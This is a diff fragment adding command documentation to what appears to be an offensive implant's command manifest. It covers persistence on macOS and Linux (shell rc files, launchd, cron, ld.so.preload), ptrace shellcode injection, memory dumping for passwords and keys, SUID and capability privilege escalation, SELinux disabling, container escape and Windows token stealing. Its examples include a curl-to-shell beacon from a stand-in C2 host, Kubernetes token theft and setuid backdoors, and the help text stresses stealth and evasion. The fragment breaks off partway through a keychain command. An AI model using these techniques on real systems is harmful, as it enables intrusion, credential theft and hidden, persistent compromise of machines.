+    "persist launch --name com.system.helper --command '/usr/local/bin/backdoor' --system",
+    "persist login --name 'System Helper' --path /Applications/Helper.app",
+    "persist periodic --command '/tmp/beacon.sh' --frequency daily"
+]
+help = """
+Establishes persistence on macOS using multiple techniques:
+
+METHODS:
+
+1. RC FILE PERSISTENCE (rc):
+   - Modifies shell startup files (.zshrc, .bash_profile, .bashrc, .profile)
+   - Executes payload when user opens terminal
+   - Options:
+     --user <username>  Target specific user (default: current)
+     --command <cmd>    Command to persist (required)
+     --files <list>     Comma-separated RC files (default: all common ones)
+   - Payload includes process check to avoid duplicates
+
+2. LAUNCHAGENT/DAEMON (launch):
+   - Creates persistent service using launchd
+   - Options:
+     --name <service>   Service identifier (required)
+     --command <cmd>    Command to execute (required)
+     --user             Install as LaunchAgent (user-level)
+     --system           Install as LaunchDaemon (system-level, requires root)
+     --interval <sec>   Execution interval in seconds (default: 3600)
+   - Creates plist in ~/Library/LaunchAgents or /Library/LaunchDaemons
+   - Service starts at boot and runs periodically
+
+3. LOGIN ITEM (login):
+   - Adds application to user's login items
+   - Options:
+     --name <name>      Display name for login item (required)
+     --path <path>      Path to application (required)
+   - Uses osascript to add item
+   - Note: Requires user approval on modern macOS (TCC)
+
+4. PERIODIC SCRIPTS (periodic):
+   - Adds to system periodic maintenance scripts
+   - Options:
+     --command <cmd>         Command to execute (required)
+     --frequency <period>    daily, weekly, or monthly (required)
+   - Installs in /etc/periodic/{daily,weekly,monthly}/
+   - Requires root privileges
+   - Runs automatically via periodic maintenance
+
+OPERATIONAL NOTES:
+- RC persistence survives reboots and is stealthy
+- LaunchAgent/Daemon provides most reliable persistence
+- Login Items visible in System Preferences
+- Periodic scripts require root but very stealthy
+- Modern macOS may prompt for permissions (TCC)
+- SIP may prevent some persistence methods
+
+EXAMPLES:
+  # Simple RC file backdoor
+  persist rc --command 'curl http://c2.evil.com/beacon | sh'
+  
+  # LaunchAgent with custom interval
+  persist launch --name com.adobe.update --command '/tmp/malware' --user --interval 300
+  
+  # System-level LaunchDaemon (requires root)
+  persist launch --name com.apple.security --command '/usr/local/bin/agent' --system
+  
+  # Add login item (visible to user)
+  persist login --name 'Dropbox Helper' --path /Applications/Evil.app
+  
+  # Daily periodic task (requires root)
+  persist periodic --command '/opt/backdoor/beacon' --frequency daily
+"""
+
+[commands.persist-cron]
+fileName = "persist-cron"
+name = "persist-cron"
+os_compatibility = ["linux"]
+description = "Manage cron-based persistence on Linux systems with multiple methods"
+syntax = """
+persist-cron <action> [options]
+Actions:
+  add [--method <method>] [--user <user>] [--interval <time>] [--command <cmd>]
+  remove [--method <method>] [--user <user>]
+  list
+"""
+examples = [
+    "persist-cron add --method spool --interval @hourly",          # User crontab persistence
+    "persist-cron add --method crond --interval '*/15 * * * *'",   # System cron.d persistence
+    "persist-cron add --method periodic --interval @daily",        # Cron directory persistence
+    "persist-cron add --method anacron",                           # Anacron persistence
+    "persist-cron add --method all --command /tmp/.daemon",        # Try all methods
+    "persist-cron add",                                            # Default: all methods, hourly
+    "persist-cron remove --method spool",                          # Remove specific method
+    "persist-cron remove --method all",                            # Remove all persistence
+    "persist-cron list"                                            # Show all persistence
+]
+help = """
+Manages cron-based persistence using multiple selectable methods for redundancy and stealth.
+
+METHODS:
+  spool     - User crontab files in /var/spool/cron/
+  crond     - System-wide /etc/cron.d/ file  
+  periodic  - Cron directories (/etc/cron.hourly, daily, weekly, monthly)
+  anacron   - Anacron for systems not always on
+  all       - Try all methods (default)
+
+ACTIONS:
+1. ADD - Install cron persistence
+   Uses selected method(s) to establish persistence:
+   
+   Method: spool
+     - Direct manipulation of crontab files
+     - Locations checked:
+       • /var/spool/cron/crontabs/<user>
+       • /var/spool/cron/<user>
+       • /var/spool/cron/tabs/<user>
+     - No crontab command used (stealthier)
+     - Checks write permissions with unix.Access
+   
+   Method: crond
+     - Creates file in /etc/cron.d/
+     - File named "system-check" (looks legitimate)
+     - System-wide execution
+     - Includes proper SHELL and PATH definitions
+   
+   Method: periodic
+     - Creates scripts in cron directories
+     - Maps intervals to appropriate directory:
+       • @hourly  → /etc/cron.hourly/
+       • @daily   → /etc/cron.daily/
+       • @weekly  → /etc/cron.weekly/
+       • @monthly → /etc/cron.monthly/
+     - Script named "system-update"
+     - Executable bash scripts (755 permissions)
+   
+   Method: anacron
+     - Modifies /etc/anacrontab
+     - For systems not running 24/7
+     - Job named "system-maint"
+     - 5-minute delay, daily execution
+   
+   Options:
+     --method <method>  Persistence method (default: all)
+     --user <user>      Target user (default: current)
+     --interval <time>  Execution interval (default: @hourly)
+     --command <cmd>    Command to run (default: current binary via /proc/self/exe)
+   
+   Interval formats:
+     @reboot          Run at startup
+     @hourly          Run every hour (randomized minute)
+     @daily           Run daily (randomized hour/minute)
+     @weekly          Run weekly (randomized day/hour/minute)
+     @monthly         Run monthly (randomized day/hour/minute)
+     '*/15 * * * *'   Standard cron format (every 15 minutes)
+     '0 2 * * *'      Daily at 2 AM
+
+2. REMOVE - Clean cron persistence
+   Removes persistence from selected method(s):
+   
+   Options:
+     --method <method>  Method to remove (default: all)
+     --user <user>      Target user (default: current)
+   
+   Cleanup targets by method:
+     spool:    User crontab files
+     crond:    /etc/cron.d/system-check
+     periodic: Scripts in cron directories
+     anacron:  Entries in /etc/anacrontab
+     all:      All of the above
+
+3. LIST - Show installed persistence
+   Scans all locations for persistence:
+   - Checks user crontabs for "Added by system at" comments
+   - Looks for /etc/cron.d/system-check
+   - Searches cron directories for system-update scripts
+   - Scans anacrontab for system-maint entries
+   - Reports all found persistence mechanisms
+
+STEALTH FEATURES:
+- Randomized execution times using Unix timestamp modulo
+- Legitimate-looking names (system-check, system-update, system-maint)
+- Timestamped comments for authenticity
+- Output redirected to /dev/null (prevents cron emails)
+- Direct file manipulation (avoids crontab command logging)
+- Uses unix.Access for permission checks (less noisy than stat)
+- Checks for existing entries to avoid duplicates
+
+SECURITY FEATURES:
+- Permission checking before write attempts
+- Proper file permissions (600 for user crons, 644 for system)
+- Falls back to /proc/self/exe or os.Args[0] for binary path
+- Handles missing users/paths gracefully
+- Returns detailed success/failure for each method
+
+REDUNDANCY:
+- Method "all" attempts every persistence technique
+- Multiple paths checked for each method
+- Continues trying other methods if one fails
+- Returns aggregated results showing what worked
+- Different methods work with different privilege levels
+
+EXAMPLES:
+  # Default persistence (all methods, hourly)
+  persist-cron add
+  
+  # Specific method with custom interval
+  persist-cron add --method spool --interval '*/30 * * * *'
+  
+  # System-wide daily persistence
+  persist-cron add --method crond --interval @daily --user root
+  
+  # Periodic execution with custom command
+  persist-cron add --method periodic --interval @weekly --command /opt/backup.sh
+  
+  # Anacron for laptops/workstations
+  persist-cron add --method anacron
+  
+  # Try everything with custom binary
+  persist-cron add --method all --command /tmp/.daemon
+  
+  # Check what's installed
+  persist-cron list
+  
+  # Remove specific method
+  persist-cron remove --method spool
+  
+  # Clean everything
+  persist-cron remove --method all
+
+OPERATIONAL NOTES:
+- No system binaries used (crontab, at, systemctl avoided)
+- Works across different Linux distributions
+- Some methods require elevated privileges:
+  • spool: Usually works for current user
+  • crond: Requires root or sudo
+  • periodic: Requires root or sudo
+  • anacron: Requires root or sudo
+- Method selection allows privilege-appropriate persistence
+- Test in controlled environment first
+- Always include cleanup in operational plans
+"""
+
+[commands.inject]
+fileName = "inject"
+name = "inject"
+os_compatibility = ["linux"]
+description = "Inject shellcode or commands into running processes via ptrace"
+syntax = """
+inject <pid> <shellcode_file> --force
+inject <pid> --cmd <command> --force
+"""
+examples = [
+    "inject 1234 /tmp/shellcode.bin --force",                      # Inject shellcode file
+    "inject 1234 --cmd '/bin/bash -c \"id > /tmp/proof\"' --force", # Inject command
+    "inject 5678 --cmd 'touch /tmp/injected' --force",             # Simple command injection
+    "inject 9999 payload.bin --force"                              # Inject custom payload
+]
+help = """
+Performs process injection on Linux using ptrace system calls.
+**REQUIRES --force FLAG to confirm you understand the risks.**
+
+INJECTION METHODS:
+
+1. SHELLCODE INJECTION:
+   inject <pid> <shellcode_file> --force
+   - Validates PID and file existence
+   - Enforces 1MB file size limit
+   - Prevents injection into PID 1 or self
+   - Shows target process name before injection
+   - Backs up original code before overwriting
+   - Restores original code after execution
+   - Uses single-stepping for controlled execution
+
+2. COMMAND INJECTION:
+   inject <pid> --cmd <command> --force
+   - Generates basic execve shellcode
+   - Limited to 100 character commands
+   - Creates /bin/sh shellcode (simplified implementation)
+   - Includes exit syscall for graceful failure
+
+SAFETY FEATURES:
+- **Mandatory --force flag** to prevent accidental execution
+- PID validation and process existence checks
+- Critical process protection (PID 1, self)
+- File size limits (1MB max for shellcode)
+- Code backup and restoration mechanism
+- 64KB shellcode execution limit
+- NOP padding for alignment
+- Detach on all error paths
+
+TECHNICAL IMPLEMENTATION:
+- Uses PTRACE_ATTACH/DETACH for process control
+- PTRACE_PEEKDATA for code backup
+- PTRACE_POKEDATA for shellcode writing
+- PTRACE_SINGLESTEP for execution
+- Saves and restores original registers
+- Overwrites current RIP location (simplified approach)
+
+RISKS AND WARNINGS:
+This operation can:
+- Crash the target process
+- Corrupt process memory
+- Trigger security alerts
+- Leave the system unstable
+- Be detected by EDR/AV systems
+
+REQUIREMENTS:
+- CAP_SYS_PTRACE capability or root
+- Target process must be ptraceable
+- Same architecture as target
+- /proc/sys/kernel/yama/ptrace_scope considerations
+
+EXAMPLES:
+  # Inject shellcode from file (with confirmation)
+  inject 1234 /tmp/reverse_shell.bin --force
+  
+  # Quick command execution (with confirmation)
+  inject 5678 --cmd 'echo pwned > /tmp/proof' --force
+  
+  # View target process before confirming
+  inject 9999 payload.bin  # Will show warning and require --force
+
+OPERATIONAL SECURITY:
+- Ptrace operations logged by auditd
+- Process name displayed before injection
+- Original code restored after execution
+- Consider testing in isolated environment first
+"""
+
+[commands.memdump]
+fileName = "memdump"
+name = "memdump"
+os_compatibility = ["linux"]
+description = "Dump and search process memory on Linux"
+syntax = """
+memdump <pid>
+memdump <pid> --output <file>
+memdump <pid> --search <pattern>
+memdump <pid> --output <file> --search <pattern>
+"""
+examples = [
+    "memdump 1234",                                        # View memory maps
+    "memdump 1234 --output /tmp/dump.bin",                 # Dump all memory
+    "memdump 1234 --search password",                      # Search for string
+    "memdump 1234 --search 'BEGIN RSA'",                   # Search for RSA keys
+    "memdump 5678 --output dump.bin --search secret"       # Dump and search
+]
+help = """
+Dumps process memory from /proc/[pid]/mem and /proc/[pid]/maps.
+
+FEATURES:
+
+1. MEMORY MAPPING:
+   Shows all memory regions of process:
+   - Address ranges
+   - Permissions (rwxp)
+   - Mapped files/libraries
+   - Anonymous regions
+
+2. MEMORY DUMPING:
+   --output <file>
+   - Reads all readable memory regions
+   - Saves to specified file
+   - Skips non-readable regions
+   - Handles large memory spaces
+
+3. PATTERN SEARCHING:
+   --search <pattern>
+   - Searches memory for string/pattern
+   - Shows address where found
+   - Reports which memory region
+   - Case-sensitive search
+   - Multiple matches per region supported
+
+SAFETY LIMITS:
+- PID validation (positive integer required)
+- Process existence verification
+- Skips memory regions larger than 50MB
+- Total dump limited to 100MB
+- Creates output directory if needed
+- Graceful handling of unreadable regions
+
+TECHNICAL DETAILS:
+- Parses /proc/[pid]/maps for regions
+- Reads /proc/[pid]/mem at offsets
+- Requires appropriate permissions
+- Usually needs root or same UID
+- Handles 64-bit address spaces
+- Continues on partial read errors
+
+MEMORY REGIONS:
+- Heap: Dynamically allocated memory
+- Stack: Function call stacks
+- Libraries: Loaded .so files
+- Anonymous: Unnamed mappings
+- Mapped files: Memory-mapped files
+
+USE CASES:
+- Extract credentials from memory
+- Find encryption keys
+- Recover deleted data
+- Analyze process state
+- Forensics investigation
+
+EXAMPLES:
+  # See what's mapped
+  memdump 1234
+  
+  # Full memory dump (up to 100MB)
+  memdump 1234 --output /tmp/firefox.dump
+  
+  # Search for passwords
+  memdump 5678 --search 'password='
+  
+  # Find SSH keys
+  memdump 9999 --search 'BEGIN RSA PRIVATE KEY'
+  
+  # Database credentials
+  memdump 3456 --search 'mysql://'
+
+LIMITATIONS:
+- Some regions unreadable (kernel, protected)
+- Requires elevated privileges usually
+- Large regions skipped (>50MB each)
+- Total dump capped at 100MB
+- ASLR randomizes addresses
+
+OPERATIONAL NOTES:
+- Can generate large files (up to 100MB)
+- May trigger security monitoring
+- Process continues running during dump
+- Clean up dump files after use
+- Consider disk space before dumping
+"""
+
+[commands.capabilities]
+fileName = "capabilities"
+name = "capabilities"
+os_compatibility = ["linux"]
+description = "Enumerate and manage Linux capabilities"
+syntax = """
+capabilities list                          - Show current process capabilities
+capabilities enum                          - Find files with capabilities
+capabilities add <cap> <file> --confirm   - Add capability to file (requires CAP_SETFCAP)
+"""
+examples = [
+    "capabilities list",                                        # Show process caps
+    "capabilities enum",                                        # Find capability files
+    "capabilities add cap_net_raw /usr/bin/ping --confirm"      # Add capability with confirmation
+]
+help = """
+Manages Linux capabilities for privilege escalation and enumeration.
+
+ACTIONS:
+
+1. LIST - Show current process capabilities
+   Reads /proc/self/status and decodes:
+   - CapInh: Inherited capabilities
+   - CapPrm: Permitted capabilities
+   - CapEff: Effective capabilities
+   - CapBnd: Bounding set
+   - CapAmb: Ambient capabilities
+   
+   Decodes capability bits to names:
+   - CAP_NET_RAW: Raw socket access
+   - CAP_SYS_ADMIN: Many admin operations
+   - CAP_DAC_OVERRIDE: Bypass file permissions
+   - CAP_SETUID: Change UID
+   - etc.
+
+2. ENUM - Find files with capabilities
+   Searches common directories:
+   - /usr/bin, /usr/sbin
+   - /bin, /sbin
+   - /usr/local/bin, /usr/local/sbin
+   
+   Uses getxattr to check security.capability
+   - Limited to 10,000 files to prevent hanging
+   - Shows capability version and size
+   - Skips symlinks and directories
+   - Reports total files checked
+
+3. ADD - Add capability to file
+   **REQUIRES --confirm FLAG for safety**
+   
+   Creates proper VFS_CAP_DATA structure:
+   - Version 2 format (0x02000000 magic)
+   - Sets capability in permitted field
+   - Binary structure with proper encoding
+   - Verifies capability was set
+   
+   Supported capabilities:
+   - cap_chown, cap_dac_override, cap_dac_read_search
+   - cap_fowner, cap_fsetid, cap_kill
+   - cap_setgid, cap_setuid, cap_setpcap
+   - cap_net_bind_service, cap_net_admin, cap_net_raw
+   - cap_sys_chroot, cap_sys_ptrace, cap_sys_admin
+   - cap_setfcap
+   
+   Safety checks:
+   - File must exist
+   - File should be executable
+   - Requires CAP_SETFCAP or root
+   - Filesystem must support xattrs
+
+IMPORTANT CAPABILITIES:
+- CAP_SYS_ADMIN: Extensive admin rights
+- CAP_SYS_PTRACE: Debug processes
+- CAP_DAC_READ_SEARCH: Read any file
+- CAP_DAC_OVERRIDE: Write any file
+- CAP_NET_ADMIN: Network configuration
+- CAP_NET_RAW: Packet sniffing
+- CAP_SETUID/SETGID: Change user/group
+- CAP_SYS_MODULE: Load kernel modules
+- CAP_CHOWN: Change file ownership
+- CAP_SETFCAP: Set file capabilities
+
+PRIVILEGE ESCALATION:
+Files with capabilities can be exploited:
+- ping with CAP_NET_RAW: packet crafting
+- python with CAP_SETUID: become root
+- perl with CAP_DAC_READ_SEARCH: read any file
+- tcpdump with CAP_NET_RAW: sniff traffic
+
+EXAMPLES:
+  # Check current process capabilities
+  capabilities list
+  
+  # Find files with capabilities
+  capabilities enum
+  
+  # Add capability (requires confirmation)
+  capabilities add cap_net_raw /usr/bin/ping --confirm
+  
+  # Add capability to custom binary
+  capabilities add cap_setuid /tmp/backdoor --confirm
+  
+  # Verify with system tool
+  getcap /usr/bin/ping
+
+RISKS OF ADD ACTION:
+Adding capabilities will:
+- Modify system file extended attributes
+- Grant additional privileges to the binary
+- Potentially create privilege escalation vector
+- Be logged by audit system
+- Persist across reboots
+
+DETECTION:
+- Capability changes logged by auditd
+- EDR solutions monitor capability use
+- Unusual capabilities are suspicious
+- getcap command shows all capabilities
+
+OPERATIONAL NOTES:
+- No external commands used
+- Direct syscall interface
+- Works across Linux distributions
+- Check after gaining initial access
+- Remove capabilities with: setcap -r <file>
+"""
+
+[commands.selinux]
+fileName = "selinux"
+name = "selinux"
+os_compatibility = ["linux"]
+description = "Check and manage SELinux status"
+syntax = """
+selinux status    - Check SELinux status
+selinux context   - Show current context
+selinux disable   - Attempt to disable (requires root)
+"""
+examples = [
+    "selinux status",                                      # Check if enforcing
+    "selinux context",                                     # Show our context
+    "selinux disable"                                      # Try to disable (needs root)
+]
+help = """
+Manages SELinux (Security-Enhanced Linux) for evasion and enumeration.
+
+ACTIONS:
+
+1. STATUS - Check SELinux state
+   Reads /sys/fs/selinux/enforce:
+   - 0: Permissive mode (logs but allows)
+   - 1: Enforcing mode (blocks violations)
+   
+   Also shows:
+   - Policy version
+   - Whether SELinux is enabled
+   - Current enforcement mode
+
+2. CONTEXT - Show current process context
+   Reads /proc/self/attr/current
+   Format: user:role:type:level
+   Example: unconfined_u:unconfined_r:unconfined_t:s0
+   
+   Contexts determine what process can do:
+   - unconfined_t: Unrestricted
+   - httpd_t: Web server restrictions
+   - sshd_t: SSH daemon restrictions
+
+3. DISABLE - Attempt to disable SELinux
+   Writes to /sys/fs/selinux/enforce
+   - Requires root or CAP_MAC_ADMIN
+   - Sets to permissive (0)
+   - Temporary until reboot
+   - May be prevented by policy
+
+SELINUX MODES:
+- Disabled: SELinux not active
+- Permissive: Logs violations, doesn't block
+- Enforcing: Blocks policy violations
+
+EVASION TECHNIQUES:
+- If permissive: Actions logged but allowed
+- If enforcing: Need to work within policy
+- Check context to understand restrictions
+- Some contexts allow more than others
+
+COMMON CONTEXTS:
+- unconfined_t: Minimal restrictions
+- initrc_t: Init script context
+- kernel_t: Kernel threads
+- admin_t: Administrative tasks
+- user_t: Regular user restrictions
+
+EXAMPLES:
+  # Reconnaissance
+  selinux status
+  selinux context
+  
+  # If we have root
+  selinux disable
+  
+  # Check if worked
+  selinux status
+
+OPERATIONAL NOTES:
+- Disabling SELinux is logged
+- Many systems alert on SELinux changes
+- Better to work within policy
+- Understand context restrictions
+- Some exploits bypass SELinux
+
+DETECTION:
+- SELinux changes heavily audited
+- aureport shows SELinux events
+- Security teams monitor mode changes
+- Better to stay undetected
+
+Note: Modern systems may prevent runtime disabling.
+Policy may need to be modified at boot.
+"""
+
+[commands.suid-enum]
+fileName = "suid-enum"
+name = "suid-enum"
+os_compatibility = ["darwin", "linux"]
+description = "Find and analyze SUID/SGID binaries for privilege escalation"
+syntax = """
+suid-enum [--check-exploits] [--output <file>] [--path <dir>]
+"""
+examples = [
+    "suid-enum",                                           # Basic enumeration
+    "suid-enum --check-exploits",                         # Check for exploitable binaries
+    "suid-enum --path /home --path /var/www",             # Search custom directories
+    "suid-enum --output /tmp/suid.txt --check-exploits",  # Save results
+    "suid-enum --path /opt/custom/bin --check-exploits"   # Check non-standard location
+]
+help = """
+Enumerates SUID/SGID binaries and identifies potential privilege escalation vectors.
+
+OPTIONS:
+  --check-exploits  Cross-reference with known exploitable binaries
+  --output <file>   Save results to specified file
+  --path <dir>      Add custom directory to search (can use multiple times)
+
+DEFAULT SEARCH PATHS:
+  /usr/bin, /usr/sbin, /bin, /sbin
+  /usr/local/bin, /usr/local/sbin
+  /opt, /snap/bin
+
+FEATURES:
+- Finds all SUID (4000) and SGID (2000) binaries
+- Shows ownership and permissions
+- Identifies unusual SUID binaries
+- Checks against 100+ known exploitable binaries (GTFOBins database)
+- Supports custom search paths for non-standard installations
+- Recursive directory searching
+
+EXPLOITABLE BINARIES DATABASE:
+Includes common exploitation vectors for:
+- Shells: bash, sh, dash, zsh, ksh
+- Editors: vim, nano, vi, emacs
+- Languages: python, perl, ruby, php, node
+- Utilities: find, tar, zip, dd, cp
+- Network: curl, wget, nc, socat
+- Package managers: pip, npm, gem
+- Many more...
+
+EXPLOITATION EXAMPLES:
+If suid-enum finds:
+  /usr/bin/python (SUID) -> python -c 'import os; os.setuid(0); os.system("/bin/bash")'
+  /usr/bin/find (SUID)   -> find . -exec /bin/bash -p \\;
+  /usr/bin/vim (SUID)    -> vim -c ':!bash'
+  /usr/bin/docker (SUID) -> docker run -v /:/host --privileged -it ubuntu
+
+UNUSUAL SUID DETECTION:
+Identifies SUID binaries that aren't typically setuid:
+- Common legitimate SUID: sudo, su, passwd, ping, mount
+- Unusual/suspicious: text editors, scripting languages, archive tools
+
+CUSTOM PATH USAGE:
+  # Search home directories for user-installed SUID binaries
+  suid-enum --path /home --check-exploits
+  
+  # Check web directories
+  suid-enum --path /var/www --path /srv/http
+  
+  # Comprehensive search including temporary directories
+  suid-enum --path /tmp --path /var/tmp --path /dev/shm
+
+OUTPUT FORMAT:
+Shows for each binary:
+- Full path
+- Owner (UID)
+- Group (GID)  
+- Permissions
+- Exploitation method (if known)
+
+OPERATIONAL NOTES:
+- No external commands required
+- Pure Go implementation
+- Fast recursive searching
+- Check after gaining initial access
+- Run periodically to find new SUID binaries
+"""
+
+[commands.container-detect]
+fileName = "container-detect"
+name = "container-detect"
+os_compatibility = ["linux"]
+description = "Detect container environment and identify escape vectors"
+syntax = """
+container-detect
+"""
+examples = [
+    "container-detect"  # Run detection and escape analysis
+]
+help = """
+Detects containerization and identifies potential container escape vectors.
+
+DETECTION METHODS:
+1. File-based detection:
+   - /.dockerenv (Docker)
+   - /run/.containerenv (Podman)
+   - /run/secrets/kubernetes.io (Kubernetes)
+
+2. Cgroup analysis:
+   - /proc/1/cgroup containing "docker"
+   - /proc/1/cgroup containing "kubepods"
+   - /proc/1/cgroup containing "lxc"
+
+3. Environment variables:
+   - KUBERNETES_SERVICE_HOST
+   - KUBERNETES_PORT
+   - container
+   - DOCKER_HOST
+
+4. Process inspection:
+   - Init process (PID 1) name
+   - Process count anomalies
+   - Capability restrictions
+
+5. Mount analysis:
+   - Host filesystem mounts
+   - Docker socket mounts
+
+CONTAINER TYPES DETECTED:
+- Docker containers
+- Kubernetes pods
+- LXC/LXD containers
+- Podman containers
+- Generic container environments
+
+ESCAPE VECTOR DETECTION:
+
+1. Docker Socket Access:
+   Checks for: /var/run/docker.sock, /run/docker.sock
+   Exploit: docker run -v /:/host --privileged -it ubuntu bash
+   Impact: Full host compromise
+
+2. Privileged Container:
+   Checks for: /dev/kmsg, extensive capabilities
+   Exploit: Direct kernel access, mount host filesystem
+   Impact: Kernel manipulation, host escape
+
+3. Dangerous Capabilities:
+   - CAP_SYS_ADMIN: Mount filesystems, many privileged operations
+   - CAP_SYS_PTRACE: Process injection across namespaces
+   - CAP_SYS_MODULE: Load kernel modules
+   - CAP_DAC_OVERRIDE: Bypass file permissions
+
+4. Host Filesystem Mounts:
+   Checks for: /host, hostPath mounts
+   Exploit: Direct host filesystem manipulation
+   Impact: Read/write host files, add persistence
+
+5. Kubernetes Specific:
+   - Service account tokens at /var/run/secrets/
+   - Kubectl access
+   - API server connectivity
+
+ESCAPE TECHNIQUES BY VECTOR:
+
+Docker Socket:
+  # Create privileged container with host mount
+  docker run -it --privileged --pid=host -v /:/host ubuntu
+  chroot /host
+
+Privileged Container:
+  # Mount host filesystem
+  mkdir /tmp/host
+  mount /dev/sda1 /tmp/host
+  
+  # Or use fdisk to find partitions
+  fdisk -l
+
+Kubernetes Token:
+  # Use service account for API access
+  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+  curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes/api/v1/
+
+PROCESS COUNT ANALYSIS:
+- Low count (<20): Likely container
+- Medium (20-100): Container or minimal host
+- High (>100): Possibly seeing host processes (privileged/pid namespace issue)
+
+OUTPUT INTERPRETATION:
+[+] Positive detection indicator
+[*] Informational finding
+[!] Security issue or escape vector
+[!!] Critical - immediate escape possible
+
+OPERATIONAL NOTES:
+- Run immediately upon initial access
+- No external tools required
+- Fast, passive detection
+- Check before attempting escapes
+- Re-run after privilege changes
+"""
+
+[commands.ld-preload]
+fileName = "ld-preload"
+name = "ld-preload"
+os_compatibility = ["linux"]
+description = "Generate and deploy LD_PRELOAD hooks for persistence and monitoring"
+syntax = """
+ld-preload generate <output.so> [--hook <function>]
+ld-preload inject <target> <library.so>
+ld-preload persist <library.so> [--user]
+"""
+examples = [
+    "ld-preload generate /tmp/hook.so --hook open",       # Generate hooking library
+    "ld-preload inject /usr/bin/id /tmp/hook.so",        # Test injection
+    "ld-preload persist /tmp/hook.so --user",            # User persistence
+    "ld-preload generate /tmp/evil.so --hook connect",   # Network hooks
+    "ld-preload persist /lib/evil.so"                    # System-wide (needs root)
+]
+help = """
+Creates and deploys LD_PRELOAD shared libraries for function hooking and persistence.
+
+ACTIONS:
+
+1. GENERATE - Create malicious shared library
+   ld-preload generate <output.so> [--hook <function>]
+   
+   Supported hooks:
+   - open: Monitor/redirect file access
+   - connect: Monitor network connections  
+   - execve: Monitor command execution
+   - Custom: Any function name (generates template)
+   
+   Generated library features:
+   - Constructor runs on load (backdoor creation)
+   - Function interposition via dlsym(RTLD_NEXT)
+   - Logging capabilities
+   - Stealth persistence mechanisms
+
+2. INJECT - Test library injection
+   ld-preload inject <target> <library.so>
+   
+   Sets LD_PRELOAD and executes target
+   Useful for testing before persistence
+   Shows immediate effects
+
+3. PERSIST - Install for automatic loading
+   ld-preload persist <library.so> [--user]
+   
+   User mode (--user):
+   - Adds to ~/.bashrc, ~/.profile, ~/.zshrc
+   - Affects user's processes only
+   - No special privileges required
+   
+   System mode (default, needs root):
+   - Adds to /etc/ld.so.preload
+   - Affects ALL processes system-wide
+   - Powerful but detectable
+
+GENERATED LIBRARY FEATURES:
+
+Constructor (runs on load):
+- Creates /tmp/.backup (setuid shell)
+- Could establish reverse shell
+- Runs before main program
+
+Hook: open()
+- Logs access to sensitive files
+- Can redirect file operations
+- Logs: /tmp/.access.log
+
+Hook: connect()
+- Monitors network connections
+- Can redirect or block connections
+- Logs: /tmp/.network.log
+
+Hook: execve()
+- Monitors command execution
+- Can prevent certain programs
+- Logs: /tmp/.exec.log
+
+COMPILATION REQUIREMENTS:
+- gcc must be installed
+- Generates and compiles C code on-the-fly
+- Links against libdl (-ldl)
+
+USAGE EXAMPLES:
+
+# Generate and test
+ld-preload generate /tmp/monitor.so --hook open
+LD_PRELOAD=/tmp/monitor.so cat /etc/passwd
+cat /tmp/.access.log
+
+# User persistence
+ld-preload persist /tmp/monitor.so --user
+# Logout and login - all processes now hooked
+
+# System-wide (dangerous!)
+sudo ld-preload persist /tmp/monitor.so
+# ALL system processes now hooked
+
+DETECTION VECTORS:
+- Check LD_PRELOAD environment variable
+- Look for /etc/ld.so.preload entries
+- Monitor for unexpected .so files
+- Check process maps for injected libraries
+- Audit library constructor functions
+
+DEFENSIVE NOTES:
+- glibc ignores LD_PRELOAD for setuid binaries
+- SELinux may block library loading
+- Some programs explicitly unset LD_PRELOAD
+- Modern systems log ld.so.preload changes
+
+OPERATIONAL SECURITY:
+- Use innocuous library names
+- Hide in legitimate library paths
+- Clean up logs periodically
+- Test thoroughly before persistence
+- Have removal plan ready
+
+REMOVAL:
+User: Remove export LD_PRELOAD from shell profiles
+System: Remove entry from /etc/ld.so.preload
+"""
+
+[commands.ps]
+fileName = "ps"
+name = "ps"
+os_compatibility = "all"
+description = "List running processes with optional filtering and detailed information"
+syntax = """
+ps                                      # Basic process list (PID, PPID, Name)
+ps -v                                   # Verbose mode with command line and executable path
+ps -x                                   # Extended mode with resource usage
+ps -j                                   # Output in JSON format
+ps -f <pattern>                         # Filter by process name
+ps -u <username>                        # Filter by username
+ps -s <field>                           # Sort by field (cpu, mem, pid, name, user, time)
+ps [flags...] [options...]              # Combine multiple flags and options
+"""
+examples = [
+    "ps",
+    "ps -v",
+    "ps -x",
+    "ps -v -x",
+    "ps -j",
+    "ps -f chrome",
+    "ps -u root",
+    "ps -s cpu",
+    "ps -x -s mem"
+]
+help = """
+Lists running processes on the target system with optional filtering and detailed information.
+
+TOKEN CONTEXT (Windows):
+When an impersonation token is active (via steal-token or make-token):
+- Process enumeration uses the impersonated user's privileges
+- May show different processes based on access rights
+- Hidden/protected processes may become visible with SYSTEM token
+- Process details (user, command line) depend on token privileges
+
+FLAGS:
+  -v, --verbose     Include command line arguments and executable path
+  -x, --extended    Include resource usage (CPU%, memory, threads, status, user)
+  -j, --json        Output in JSON format for parsing/scripting
+
+OPTIONS:
+  -f, --filter <pattern>    Filter processes by name (partial match, case-insensitive)
+  -u, --user <username>     Show only processes owned by specified user
+  -s, --sort <field>        Sort output by field
+
+SORT FIELDS:
+  cpu     Sort by CPU usage (highest first)
+  mem     Sort by memory usage (highest first)  
+  pid     Sort by process ID (ascending)
+  name    Sort by process name (alphabetical)
+  user    Sort by username (alphabetical)
+  time    Sort by creation time (oldest first)
+
+OUTPUT COLUMNS:
+
+Basic mode:
+  PID      Process ID
+  PPID     Parent Process ID
+  NAME     Process name
+
+Extended mode (-x) adds:
+  USER     Process owner
+  CPU%     CPU usage percentage
+  MEM%     Memory usage percentage
+  MEM(MB)  Memory usage in megabytes
+  THREADS  Number of threads
+  STATUS   Process status (Running, Sleeping, Stopped, etc.)
+
+Verbose mode (-v) adds:
+  EXECUTABLE  Full path to executable
+  COMMAND     Full command line with arguments
+
+EXAMPLES WITH TOKENS:
+
+Without token:
+  ps -x                 # Shows processes visible to current user
+  
+With SYSTEM token:
+  steal-token 1752 system
+  ps -x                 # Shows ALL processes including protected ones
+  ps -f lsass           # Can now see details of protected processes
+  rev2self              # Revert token
+
+Combined with filtering:
+  steal-token use admin
+  ps -u SYSTEM          # List all SYSTEM processes with admin token
+  ps -f svchost -x      # Detailed view of service hosts
+"""
+
+[commands.keychain]
+fileName = "keychain"
+name = "keychain"
+os_compatibility = ["darwin"]
+description = "Access and manipulate macOS Keychain items"
+syntax = """
+keychain list
+keychain dump [--keychain <keychain_path>]
+keychain search [--service <service>] [--account <account>] [--label <label>]
+keychain add --service <service> --account <account> --password <password>
